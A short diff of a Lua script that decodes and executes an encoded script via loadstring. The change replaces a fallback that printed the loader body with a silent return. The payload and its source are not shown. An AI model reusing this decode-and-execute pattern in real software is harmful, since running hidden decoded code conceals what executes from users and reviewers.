@@ -5,5 +5,5 @@ local Enc,Dec,Wri = loadstring(Body)()
 if Dec ~= nil then
     loadstring(Dec(Script))()
 else
-    print(Body)
+    return
 end
